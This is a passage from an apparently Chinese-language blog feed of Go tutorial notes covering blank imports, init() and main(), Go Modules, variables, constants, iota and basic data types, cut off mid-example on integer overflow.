message.&quot;</span>)&#125;</code></pre><p>我只想引入这个模块，但不想用这个模块的任何函数。那么可以在引入这个模块的时候，使用<code>_</code>丢弃这个包。<br>main.go 中的代码：</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> _ <span class="hljs-string">&quot;gitee.com/quanquan616/hello&quot;</span> <span class="hljs-comment">//引入的同时，丢弃这个包，我只想做初始化使用</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">this message from hello/hello.go init() function.</span><span class="hljs-comment"></span><span class="hljs-comment">Process finished with exit code 0</span><span class="hljs-comment">*/</span></code></pre><p>编译通过，没有任何问题，而且也可以看到 Golang 自动调用了 hello/hello.go 中的 init() 函数。</p><h5 id="9-1-5-4-下划线-丢弃包的常用场景1"><a href="#9-1-5-4-下划线-丢弃包的常用场景1" class="headerlink" title="9.1.5.4 下划线_丢弃包的常用场景1"></a>9.1.5.4 下划线<code>_</code>丢弃包的常用场景1</h5><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;database/sql&quot;</span><span class="hljs-keyword">import</span> _ <span class="hljs-string">&quot;github.com/go-sql-driver/mysql&quot;</span></code></pre><p>第二个 import 就是不使用 mysql 包，将其丢弃，只是执行一下这个包的 init() 函数，把 mysql 的驱动注册到 sql 包里，然后程序里就可以使用 sql 包来访问 mysql 数据库了。</p><h3 id="9-2-Go-Module-模块管理"><a href="#9-2-Go-Module-模块管理" class="headerlink" title="9.2 Go Module 模块管理"></a>9.2 Go Module 模块管理</h3><p>Go1.11 开始，官方推出并建议使用 <code>Go Module</code> 来管理工程。<br>详情使用：<a href="https://blog.csdn.net/zhangyibei2008/article/details/104672471">link</a></p><h2 id="十、main-函数和init-函数"><a href="#十、main-函数和init-函数" class="headerlink" title="十、main()函数和init()函数"></a>十、main()函数和init()函数</h2><p>Golang 有两个保留函数：<code>main()</code> 和 <code>init()</code>。这两个函数在定义时不能有任何的参数和返回值，Go 程序会自动调用这两个函数。</p><h3 id="10-1-main-函数的特性"><a href="#10-1-main-函数的特性" class="headerlink" title="10.1 main()函数的特性"></a>10.1 main()函数的特性</h3><p>1.main() 函数是 Go 程序的唯一入口。<br>2.main() 函数只能应用于 main 包中，main 包中必须包含有且只有一个 <code>main()</code> 函数。</p><h3 id="10-2-init-函数的特性"><a href="#10-2-init-函数的特性" class="headerlink" title="10.2 init()函数的特性"></a>10.2 init()函数的特性</h3><p>1.init() 函数是用于程序执行前做包的初始化的函数，比如初始化包里的变量等。<br>init() 函数能够应用于所有的包中，可选的，可写可不写。init() 函数会在程序执行开始的时候被调用。所有被编译器发现的 init() 函数，都会安排在 main() 函数之前执行。init() 函数通常用在设置包、初始化变量或者其他先行引导工作。<br>2.不同包的 init() 函数，按照包导入的依赖关系决定该初始化函数的执行顺序。<br>3.init() 函数不能被其他函数调用，而是在 main() 函数执行之前，自动被调用。<br>4.每个包可以拥有多个 init() 函数。<br>不推荐这么做，强烈建议每个文件只写一个 init() 函数。</p><h3 id="10-3-包的其他特性"><a href="#10-3-包的其他特性" class="headerlink" title="10.3 包的其他特性"></a>10.3 包的其他特性</h3><p>1.有时候一个包会被多个包同时导入，那么它只会被导入一次。（例如：很多包都会用到fmt包，但它只会被导入一次）<br>2.当一个包被导入时，如果该包还导入了其他的包，那么会先将其他包导入进来，然后再对这些包中的包级常量和变量进行初始化，紧接着执行 init() 函数（如果有）。等所有被导入的包都加载完毕了，就会对 main 包中的包级常量和变量进行初始化，然后执行 main 包中的 init() 函数（如果有），最后执行 main() 函数。</p><h3 id="10-4-init-函数和main-函数的异同"><a href="#10-4-init-函数和main-函数的异同" class="headerlink" title="10.4 init()函数和main()函数的异同"></a>10.4 init()函数和main()函数的异同</h3><p>共同点：两个函数在定义时不能有任何的参数和返回值，且由 Go 程序自动调用。<br>不同电：init() 函数可以应用于任意包中，且可以重复定义多个。main() 函数只能用于 main 包中，且只能定义一个。</p>]]></content>
    
    
    <categories>
      
      <category>编程之美</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang学习之基本类型与流程控制</title>
    <link href="/p/f6d90fce.html"/>
    <url>/p/f6d90fce.html</url>
    
    <content type="html"><![CDATA[<p><strong>Golang环境：</strong><a href="https://studygolang.com/dl">https://studygolang.com/dl</a></p><p><strong>LiteIde：</strong><a href="http://liteide.org/cn/">http://liteide.org/cn/</a></p><p><strong>Golang标准库文档：</strong><a href="https://studygolang.com/pkgdoc">https://studygolang.com/pkgdoc</a></p><p><strong>命令行下使用基础</strong></p><pre><code class="hljs go"><span class="hljs-keyword">go</span> version <span class="hljs-comment">//查看go版本</span><span class="hljs-keyword">go</span> env     <span class="hljs-comment">//查看环境信息</span><span class="hljs-keyword">go</span> build xx.<span class="hljs-keyword">go</span><span class="hljs-comment">//编译代码，生成可执行的exe文件</span><span class="hljs-keyword">go</span> run xx.<span class="hljs-keyword">go</span><span class="hljs-comment">//运行go文件</span></code></pre><h2 id="一、第一个-Go-程序"><a href="#一、第一个-Go-程序" class="headerlink" title="一、第一个 Go 程序"></a>一、第一个 Go 程序</h2><pre><code class="hljs go"><span class="hljs-comment">// 1.go语言以包作为管理单位</span><span class="hljs-comment">// 2.每个go文件都必须在非注释的第一行代码中声明包名</span><span class="hljs-comment">// 3.liteide下，一个文件夹（目录）下，只能有一个main包</span><span class="hljs-comment">// 4.main包中有且只有一个main()函数</span><span class="hljs-keyword">package</span> main <span class="hljs-comment">// main 表示包的标识</span><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-comment">// 程序的入口，是从这里开始调用的</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123; <span class="hljs-comment">//左括号必须和函数名同行</span><span class="hljs-comment">//打印</span><span class="hljs-comment">//&quot;hello go&quot;打印到屏幕，Println()会自动换行</span><span class="hljs-comment">//调用函数，大部分都需要导入包</span><span class="hljs-comment">/*</span><span class="hljs-comment">这也是注释，这是块注释</span><span class="hljs-comment">*/</span>fmt.Println(<span class="hljs-string">&quot;hello go&quot;</span>) <span class="hljs-comment">//go语言语句结尾是没有分号的</span>fmt.Println(<span class="hljs-string">&quot;hello world&quot;</span>)&#125;</code></pre><p>注意：关键字 <code>import</code> 后面的最后一个元素是目录名，而不是包名。Golang 编译器在这个路径下寻找包。</p><h3 id="1-1-入口"><a href="#1-1-入口" class="headerlink" title="1.1 入口"></a>1.1 入口</h3><p>**一个 go 工程有且只有一个入口函数 main()**。<br>注意：<code>main()</code> 函数不能有任何参数和返回值。</p><h3 id="1-2-Golang-保留的关键字"><a href="#1-2-Golang-保留的关键字" class="headerlink" title="1.2 Golang 保留的关键字"></a>1.2 Golang 保留的关键字</h3><pre><code class="hljs go">包管理（<span class="hljs-number">2</span>个）：<span class="hljs-keyword">import</span><span class="hljs-keyword">package</span>程序实体声明与定义（<span class="hljs-number">8</span>个）：<span class="hljs-keyword">chan</span><span class="hljs-keyword">const</span><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-title">interface</span><span class="hljs-title">map</span><span class="hljs-title">struct</span><span class="hljs-title">type</span><span class="hljs-title">var</span></span>程序流程控制（<span class="hljs-number">15</span>个）：<span class="hljs-keyword">break</span><span class="hljs-keyword">case</span><span class="hljs-keyword">continue</span><span class="hljs-keyword">default</span><span class="hljs-keyword">defer</span><span class="hljs-keyword">else</span><span class="hljs-keyword">fallthrough</span><span class="hljs-keyword">for</span><span class="hljs-keyword">go</span><span class="hljs-keyword">goto</span><span class="hljs-keyword">if</span><span class="hljs-keyword">range</span><span class="hljs-keyword">return</span><span class="hljs-keyword">select</span><span class="hljs-keyword">switch</span></code></pre><h3 id="1-3-Golang预定义标识符"><a href="#1-3-Golang预定义标识符" class="headerlink" title="1.3 Golang预定义标识符"></a>1.3 Golang预定义标识符</h3><pre><code class="hljs go">常量:<span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">iota</span>, <span class="hljs-literal">nil</span>类型:<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int8</span>, <span class="hljs-keyword">int16</span>, <span class="hljs-keyword">int32</span>, <span class="hljs-keyword">int64</span>, <span class="hljs-keyword">uint</span>,<span class="hljs-keyword">uint8</span>, <span class="hljs-keyword">uint16</span>, <span class="hljs-keyword">uint32</span>, <span class="hljs-keyword">uint64</span>, <span class="hljs-keyword">uintptr</span>,<span class="hljs-keyword">float32</span>, <span class="hljs-keyword">float64</span>, <span class="hljs-keyword">complex128</span>, <span class="hljs-keyword">complex64</span>,<span class="hljs-keyword">bool</span>, <span class="hljs-keyword">byte</span>, <span class="hljs-keyword">rune</span>, <span class="hljs-keyword">string</span>函数:<span class="hljs-built_in">make</span>, <span class="hljs-built_in">len</span>, <span class="hljs-built_in">cap</span>, <span class="hljs-built_in">new</span>, <span class="hljs-built_in">append</span>, <span class="hljs-built_in">copy</span>, <span class="hljs-built_in">close</span>, <span class="hljs-built_in">delete</span>, <span class="hljs-built_in">complex</span>, <span class="hljs-built_in">real</span>, <span class="hljs-built_in">imag</span>, <span class="hljs-built_in">panic</span>, <span class="hljs-built_in">recover</span></code></pre><h2 id="二、数据类型"><a href="#二、数据类型" class="headerlink" title="二、数据类型"></a>二、数据类型</h2><p>类型表示同一类的数据，计算机用来计算，计算前需要把数据存储起来，那么如何存储数据？</p><h3 id="2-1-数据类型的作用"><a href="#2-1-数据类型的作用" class="headerlink" title="2.1 数据类型的作用"></a>2.1 数据类型的作用</h3><p>告诉编译器，这个数据应该以多大的内存进行存储，方便内存分配空间。<br>例如：写了一个数字 10，以 byte 类型存储，在内存中就占 1 个字节的大小；以 int 类型存储，在内存中就占4个字节。</p><h3 id="2-2-数据类型的命名规则"><a href="#2-2-数据类型的命名规则" class="headerlink" title="2.2 数据类型的命名规则"></a>2.2 数据类型的命名规则</h3><p>1.由字母、下划线、数字构成<br>2.不能以数字开头<br>3.不能使用关键字<br>4.<strong>严格区分大小写</strong></p><h3 id="2-3-变量"><a href="#2-3-变量" class="headerlink" title="2.3 变量"></a>2.3 变量</h3><h4 id="2-3-1-何为变量"><a href="#2-3-1-何为变量" class="headerlink" title="2.3.1 何为变量"></a>2.3.1 何为变量</h4><p>程序运行期间，可以改变的量。简而言之：一开始给它一个值，之后可以改变它的值。</p><h4 id="2-3-2-声明变量"><a href="#2-3-2-声明变量" class="headerlink" title="2.3.2 声明变量"></a>2.3.2 声明变量</h4><p><strong>变量在使用前（赋值、打印等操作），必须先声明</strong>！<br>语法：<code>var 变量名 数据类型</code><br>1.声明一个变量 <code>var a int</code><br>2.同时声明多个变量 <code>var b, c int</code></p><h4 id="2-3-3-变量的声明及赋值"><a href="#2-3-3-变量的声明及赋值" class="headerlink" title="2.3.3 变量的声明及赋值"></a>2.3.3 变量的声明及赋值</h4><p>例1：</p><pre><code class="hljs go"><span class="hljs-keyword">var</span> a <span class="hljs-keyword">int</span>a = <span class="hljs-number">10</span></code></pre><h4 id="2-3-4-变量的初始化"><a href="#2-3-4-变量的初始化" class="headerlink" title="2.3.4 变量的初始化"></a>2.3.4 变量的初始化</h4><p>所谓变量的初始化就是：声明变量的时候同时赋值。<br>例1：</p><pre><code class="hljs go"><span class="hljs-keyword">var</span> b <span class="hljs-keyword">int</span> = <span class="hljs-number">10</span> <span class="hljs-comment">// 声明变量时，同时赋值（一步到位）</span><span class="hljs-comment">// int是可以省略不写的</span></code></pre><p>例2：</p><pre><code class="hljs go"><span class="hljs-keyword">var</span> b <span class="hljs-keyword">int</span>b = <span class="hljs-number">20</span><span class="hljs-comment">// 此例中分了两步走：</span><span class="hljs-comment">// 1.先声明</span><span class="hljs-comment">// 2.后赋值</span></code></pre><h4 id="2-3-5-自动推导类型"><a href="#2-3-5-自动推导类型" class="headerlink" title="2.3.5 自动推导类型"></a>2.3.5 自动推导类型</h4><p>注意：<strong>自动推导类型必须给初始化值，它是通过这个值来确定具体的数据类型</strong>！<br>例1：</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;c := <span class="hljs-number">30</span> <span class="hljs-comment">// 编译器会根据 30 这个值来推导对应的数据类型</span><span class="hljs-comment">// %T 打印变量所属的类型</span>fmt.Printf(<span class="hljs-string">&quot;c type is : %T\n&quot;</span>, c)<span class="hljs-comment">// 运行结果：</span><span class="hljs-comment">// c type is : int</span>&#125;</code></pre><p>自动推导类型的大致流程：先声明 c 的类型，再给 c 赋值为整数值 30。<br>注意：<strong>海象运算符 := 前面，必须要有新的变量，不然就会报错</strong>。因为海象运算符的流程是先声明变量的类型，再给变量赋值（几乎同时发生），如果没有新的变量，那么就会变成重复声明了。</p><h4 id="2-3-6-多重赋值"><a href="#2-3-6-多重赋值" class="headerlink" title="2.3.6 多重赋值"></a>2.3.6 多重赋值</h4><h5 id="2-3-6-1-var-包裹起来的多重声明"><a href="#2-3-6-1-var-包裹起来的多重声明" class="headerlink" title="2.3.6.1 var() 包裹起来的多重声明"></a>2.3.6.1 <code>var()</code> 包裹起来的多重声明</h5><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> (a <span class="hljs-keyword">int</span>b <span class="hljs-keyword">float64</span>) <span class="hljs-comment">// 关键字var+()，把多个变量包裹起来</span>a = <span class="hljs-number">10</span>b = <span class="hljs-number">3.14</span>fmt.Println(a, b) <span class="hljs-comment">// 10 3.14</span>&#125;</code></pre><h5 id="2-3-6-2-自动推导类型（官方推荐写法）"><a href="#2-3-6-2-自动推导类型（官方推荐写法）" class="headerlink" title="2.3.6.2 自动推导类型（官方推荐写法）"></a>2.3.6.2 自动推导类型（官方推荐写法）</h5><p>使用海象运算符 <code>:=</code>：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;a, b := <span class="hljs-number">10</span>, <span class="hljs-number">3.14</span>fmt.Println(a, b) <span class="hljs-comment">// 10 3.14</span>&#125;</code></pre><h4 id="2-3-7-匿名变量"><a href="#2-3-7-匿名变量" class="headerlink" title="2.3.7 匿名变量"></a>2.3.7 匿名变量</h4><p>使用单个下划线 <code>_</code> 表示匿名变量，丢弃数据且不处理，也不会占用内存空间。</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;i, j := <span class="hljs-number">10</span>, <span class="hljs-number">20</span>tmp, _ := i, j <span class="hljs-comment">// 这里，j就被丢弃掉了，不会处理j这个变量了</span>fmt.Println(tmp, j) <span class="hljs-comment">// 打印j的值依然是用之前的20</span>&#125;</code></pre><h4 id="2-3-8-变量的输入"><a href="#2-3-8-变量的输入" class="headerlink" title="2.3.8 变量的输入"></a>2.3.8 变量的输入</h4><p>使用内建 <code>fmt</code> 包下的 <code>Scan()</code> 函数：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> a <span class="hljs-keyword">int</span>fmt.Printf(<span class="hljs-string">&quot;输入变量a的值：&quot;</span>)fmt.Scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;a) <span class="hljs-comment">// 取a的地址，此处会阻塞等待用户的输入</span><span class="hljs-comment">// 或者下面更加简便的等价的写法：</span><span class="hljs-comment">// fmt.Scan(&amp;a) // 别忘了取地址</span>fmt.Printf(<span class="hljs-string">&quot;刚才输入的值，a=%d\n&quot;</span>, a)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">输入变量a的值：11</span><span class="hljs-comment">刚才输入的值，a=11</span><span class="hljs-comment">*/</span></code></pre><h4 id="2-3-9-变量使用注意事项"><a href="#2-3-9-变量使用注意事项" class="headerlink" title="2.3.9 变量使用注意事项"></a>2.3.9 变量使用注意事项</h4><p>1.函数外的每个语句都必须以关键字开始。（<code>var</code>、<code>const</code>、<code>func</code> 等）<br>2.海象运算符 <code>:=</code> 不能在函数外使用。<br>3.下划线 <code>_</code> 多用于占位，不会占用内存空间，表示丢弃该值。</p><h3 id="2-4-常量"><a href="#2-4-常量" class="headerlink" title="2.4 常量"></a>2.4 常量</h3><h4 id="2-4-1-何为常量"><a href="#2-4-1-何为常量" class="headerlink" title="2.4.1 何为常量"></a>2.4.1 何为常量</h4><p>程序运行期间，不能改变的量。一开始给了值，就不允许再改变了！</p><h4 id="2-4-2-初始化常量"><a href="#2-4-2-初始化常量" class="headerlink" title="2.4.2 初始化常量"></a>2.4.2 初始化常量</h4><p>常量必须给值，所以就是直接初始化常量了，声明和赋值一步完成。</p><h5 id="2-4-2-1-语法"><a href="#2-4-2-1-语法" class="headerlink" title="2.4.2.1 语法"></a>2.4.2.1 语法</h5><p><code>const 常量名 [数据类型] = 值</code></p><h5 id="2-4-2-2-例1，单个初始化"><a href="#2-4-2-2-例1，单个初始化" class="headerlink" title="2.4.2.2 例1，单个初始化"></a>2.4.2.2 例1，单个初始化</h5><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-keyword">const</span> a = <span class="hljs-number">10</span><span class="hljs-keyword">const</span> b = <span class="hljs-number">10</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;fmt.Println(a, b)&#125;</code></pre><h5 id="2-4-2-3-例2，包裹起来一起初始化"><a href="#2-4-2-3-例2，包裹起来一起初始化" class="headerlink" title="2.4.2.3 例2，包裹起来一起初始化"></a>2.4.2.3 例2，包裹起来一起初始化</h5><p>把例1的常量声明，用括号括起来，写在一起：</p><pre><code class="hljs go"><span class="hljs-keyword">const</span> (a = <span class="hljs-number">10</span>b = <span class="hljs-number">10</span>)</code></pre><h5 id="2-4-2-4-例3，多重初始化"><a href="#2-4-2-4-例3，多重初始化" class="headerlink" title="2.4.2.4 例3，多重初始化"></a>2.4.2.4 例3，多重初始化</h5><pre><code class="hljs go"><span class="hljs-keyword">const</span> a, b = <span class="hljs-number">10</span>, <span class="hljs-number">3.14</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;fmt.Println(a, b) <span class="hljs-comment">//10 3.14</span>&#125;</code></pre><h4 id="2-4-3-iota枚举"><a href="#2-4-3-iota枚举" class="headerlink" title="2.4.3 iota枚举"></a>2.4.3 iota枚举</h4><h5 id="2-4-3-1-iota的特性1"><a href="#2-4-3-1-iota的特性1" class="headerlink" title="2.4.3.1 iota的特性1"></a>2.4.3.1 iota的特性1</h5><p><code>iota</code> 是常量自动生成器，每一行，自动累加1。</p><h5 id="2-4-3-2-iota的特性2"><a href="#2-4-3-2-iota的特性2" class="headerlink" title="2.4.3.2 iota的特性2"></a>2.4.3.2 iota的特性2</h5><p><code>iota</code> 只能在常量表达式中使用（只能在 <code>const</code> 中使用）。<br>特性1 + 特性2的示例：</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-keyword">const</span> (a = <span class="hljs-literal">iota</span>b = <span class="hljs-literal">iota</span>c = <span class="hljs-literal">iota</span>)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;fmt.Printf(<span class="hljs-string">&quot;a = %d, b = %d, c = %d\n&quot;</span>, a, b, c) <span class="hljs-comment">//a = 0, b = 1, c = 2</span>&#125;</code></pre><h5 id="2-4-3-3-iota的特性3"><a href="#2-4-3-3-iota的特性3" class="headerlink" title="2.4.3.3 iota的特性3"></a>2.4.3.3 iota的特性3</h5><p>遇到另一个 <code>const</code>，<code>iota</code> 的值重新从 0 开始计算。</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-keyword">const</span> (a = <span class="hljs-literal">iota</span>bc)<span class="hljs-keyword">const</span> (d = <span class="hljs-literal">iota</span>e)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">const</span> (f = <span class="hljs-literal">iota</span>gh)fmt.Println(<span class="hljs-string">&quot;a=&quot;</span>, a)fmt.Println(<span class="hljs-string">&quot;b=&quot;</span>, b)fmt.Println(<span class="hljs-string">&quot;c=&quot;</span>, c)fmt.Println(<span class="hljs-string">&quot;d=&quot;</span>, d)fmt.Println(<span class="hljs-string">&quot;e=&quot;</span>, e)fmt.Println(<span class="hljs-string">&quot;f=&quot;</span>, f)fmt.Println(<span class="hljs-string">&quot;g=&quot;</span>, g)fmt.Println(<span class="hljs-string">&quot;h=&quot;</span>, h)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">a= 0</span><span class="hljs-comment">b= 1</span><span class="hljs-comment">c= 2</span><span class="hljs-comment">d= 0</span><span class="hljs-comment">e= 1</span><span class="hljs-comment">f= 0</span><span class="hljs-comment">g= 1</span><span class="hljs-comment">h= 2</span><span class="hljs-comment">*/</span></code></pre><h5 id="2-4-3-4-iota的特性4"><a href="#2-4-3-4-iota的特性4" class="headerlink" title="2.4.3.4 iota的特性4"></a>2.4.3.4 iota的特性4</h5><p>同一块 <code>const</code> 内，可以只写一个 <code>iota</code> 预定义标识符。</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">const</span> (a1 = <span class="hljs-literal">iota</span>b1c1d1)fmt.Printf(<span class="hljs-string">&quot;a1 = %d, b1 = %d, c1 = %d, d1 = %d\n&quot;</span>, a1, b1, c1, d1) <span class="hljs-comment">//a1 = 0, b1 = 1, c1 = 2, d1 = 3</span>&#125;</code></pre><h5 id="2-4-3-5-iota的特性5"><a href="#2-4-3-5-iota的特性5" class="headerlink" title="2.4.3.5 iota的特性5"></a>2.4.3.5 iota的特性5</h5><p>如果是同一行，<code>iota</code> 值都一样。</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">const</span> (i          = <span class="hljs-literal">iota</span>j1, j2, j3 = <span class="hljs-literal">iota</span>, <span class="hljs-literal">iota</span>, <span class="hljs-literal">iota</span>k          = <span class="hljs-literal">iota</span>)fmt.Printf(<span class="hljs-string">&quot;i=%d, j1=%d, j2=%d, j3=%d, k=%d\n&quot;</span>, i, j1, j2, j3, k) <span class="hljs-comment">//i=0, j1=1, j2=1, j3=1, k=2</span>&#125;</code></pre><p>原因：<code>iota</code> 是每一行自动累加 <code>1</code>，在同一行内的 <code>iota</code> 值都是相同的。</p><h5 id="2-4-3-6-iota的特性6"><a href="#2-4-3-6-iota的特性6" class="headerlink" title="2.4.3.6 iota的特性6"></a>2.4.3.6 iota的特性6</h5><p><code>iota</code> 的值，只取决于它所在第几行（下标从 0 开始），可以理解成为：行索引。</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">const</span> (i          = <span class="hljs-number">10</span>j1, j2, j3 = <span class="hljs-literal">iota</span>, <span class="hljs-literal">iota</span>, <span class="hljs-literal">iota</span>k          = <span class="hljs-number">20</span>l, m       = <span class="hljs-literal">iota</span>, <span class="hljs-literal">iota</span>n          = <span class="hljs-string">&quot;abc&quot;</span>o          = <span class="hljs-literal">iota</span>)fmt.Printf(<span class="hljs-string">&quot;i=%d, j1=%d, j2=%d, j3=%d, k=%d, l=%d, m=%d, n=%s, o=%d\n&quot;</span>, i, j1, j2, j3, k, l, m, n, o)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">i=10, j1=1, j2=1, j3=1, k=20, l=3, m=3, n=abc, o=5</span><span class="hljs-comment">*/</span></code></pre><h4 id="2-4-4-常量使用的注意事项"><a href="#2-4-4-常量使用的注意事项" class="headerlink" title="2.4.4 常量使用的注意事项"></a>2.4.4 常量使用的注意事项</h4><h5 id="2-4-4-1-初始化常量不允许使用海象运算符"><a href="#2-4-4-1-初始化常量不允许使用海象运算符" class="headerlink" title="2.4.4.1 初始化常量不允许使用海象运算符:="></a>2.4.4.1 初始化常量不允许使用海象运算符<code>:=</code></h5><pre><code class="hljs go"><span class="hljs-keyword">const</span> :b = <span class="hljs-number">10</span></code></pre><h5 id="2-4-4-2-常量不允许被修改"><a href="#2-4-4-2-常量不允许被修改" class="headerlink" title="2.4.4.2 常量不允许被修改"></a>2.4.4.2 常量不允许被修改</h5><p>下例中，对常量重新赋值就会报错：</p><pre><code class="hljs go"><span class="hljs-keyword">const</span> a = <span class="hljs-number">10</span>a = <span class="hljs-number">20</span></code></pre><h5 id="2-4-4-3-常量必须给值"><a href="#2-4-4-3-常量必须给值" class="headerlink" title="2.4.4.3 常量必须给值"></a>2.4.4.3 常量必须给值</h5><p>常量表示不可变的值，不给初始值，怎么让编译器去常量化呢？</p><pre><code class="hljs go"><span class="hljs-keyword">const</span>(a <span class="hljs-keyword">int</span>b)</code></pre><h2 id="三、基础数据类型"><a href="#三、基础数据类型" class="headerlink" title="三、基础数据类型"></a>三、基础数据类型</h2><p>指定数据类型是告诉编译器，这个值需要分配多大的内存空间。</p><h3 id="3-1-总述"><a href="#3-1-总述" class="headerlink" title="3.1 总述"></a>3.1 总述</h3><h4 id="3-1-1-Go-语言中的数据类型"><a href="#3-1-1-Go-语言中的数据类型" class="headerlink" title="3.1.1 Go 语言中的数据类型"></a>3.1.1 Go 语言中的数据类型</h4><p>以下是 Go 语言中的数据类型：</p><table><thead><tr><th>类型</th><th>名称</th><th>长度</th><th>零值</th><th>说明</th></tr></thead><tbody><tr><td>bool</td><td>布尔类型</td><td>1</td><td>false</td><td>其值不为真即为假，不可以用数字代表true或false</td></tr><tr><td>byte</td><td>字节型</td><td>1</td><td>0</td><td>uint8别名</td></tr><tr><td>rune</td><td>字符类型</td><td>4</td><td>0</td><td>专用于存储unicode编码，等价于uint32</td></tr><tr><td>int, uint</td><td>整型</td><td>4或8</td><td>0</td><td>32位或64位</td></tr><tr><td>int8, uint8</td><td>整型</td><td>1</td><td>0</td><td>-128 ~ 127, 0 ~ 255</td></tr><tr><td>int16, uint16</td><td>整型</td><td>2</td><td>0</td><td>-32768 ~ 32767, 0 ~ 65535</td></tr><tr><td>int32, uint32</td><td>整型</td><td>4</td><td>0</td><td>-21亿 ~ 21 亿, 0 ~ 42 亿</td></tr><tr><td>int64, uint64</td><td>整型</td><td>8</td><td>0</td><td></td></tr><tr><td>float32</td><td>浮点型</td><td>4</td><td>0.0</td><td>小数位精确到7位</td></tr><tr><td>float64</td><td>浮点型</td><td>8</td><td>0.0</td><td>小数位精确到15位</td></tr><tr><td>complex64 复数类型</td><td>8</td><td></td><td></td><td></td></tr><tr><td>complex128 复数类型</td><td>16</td><td></td><td></td><td></td></tr><tr><td>uintptr 整型</td><td>4或8</td><td></td><td></td><td>以存储指针的uint32或uint64整数</td></tr><tr><td>string</td><td>字符串</td><td>“”</td><td></td><td>utf-8字符串</td></tr></tbody></table><h4 id="3-1-2-Go-语言的数据类型分类"><a href="#3-1-2-Go-语言的数据类型分类" class="headerlink" title="3.1.2 Go 语言的数据类型分类"></a>3.1.2 Go 语言的数据类型分类</h4><p>1.基础类型（Basic Types）。包括了：数值类型（支持整型、浮点型、复数）、字符串类型、布尔类型。<br>2.符合类型（Aggregate Types）。包括了：数组、结构体。<br>3.引用类型（Reference Types）。包括了：指针、切片、map、channel、接口、函数。</p><h4 id="3-1-3-注意数据类型的溢出"><a href="#3-1-3-注意数据类型的溢出" class="headerlink" title="3.1.3 注意数据类型的溢出"></a>3.1.3 注意数据类型的溢出</h4><p>每个数据类型都有一个固定的取值范围，数据类型的值，不能超过这个范围。<br>数据类型的溢出有 2 种：编译时、运行时。</p><h5 id="3-1-3-1-数据类型编译时的溢出"><a href="#3-1-3-1-数据类型编译时的溢出" class="headerlink" title="3.1.3.1 数据类型编译时的溢出"></a>3.1.3.1 数据类型编译时的溢出</h5><p>以下示例会导致编译时就报错：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> i <span class="hljs-keyword">uint8</span><span class="hljs-keyword">for</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">270</span>; i++ 